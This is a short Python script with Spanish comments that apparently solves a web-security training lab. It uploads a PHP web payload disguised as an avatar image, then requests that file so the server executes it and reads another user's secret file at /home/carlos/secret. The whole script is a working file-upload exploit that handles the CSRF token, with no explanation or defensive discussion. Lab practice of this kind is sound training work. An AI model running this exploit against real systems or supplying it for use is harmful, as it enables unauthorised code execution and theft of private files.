import requests
from bs4 import BeautifulSoup

# Definir la URL base y crear una sesión
LAB_URL = "https://example.com"
SESSION = requests.Session()

# Obtener token CSRF
def get_csrf_token(url):
    page = SESSION.get(url)
    soup = BeautifulSoup(page.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token

# Subir archivo PHP
def upload_file():
    csrf_token = get_csrf_token(f"{LAB_URL}/my-account?id=wiener")
    files = {"avatar": ("exploit.php", "<?php echo file_get_contents('/home/carlos/secret'); ?>")}
    data = {"csrf": csrf_token, "user": "wiener", "id": "wiener"}
    response = SESSION.post(f"{LAB_URL}/my-account/avatar?id=wiener", files=files, data=data)
    return response

# Ejecutar el archivo PHP y obtener el secreto
def get_secret():
    secret_response = SESSION.get(f"{LAB_URL}/files/avatars/exploit.php")
    return secret_response.text.strip()

# Resolver el lab
response = upload_file()
if "has been uploaded" in response.text:
    secret = get_secret()
    print(f"Secreto obtenido: {secret}")
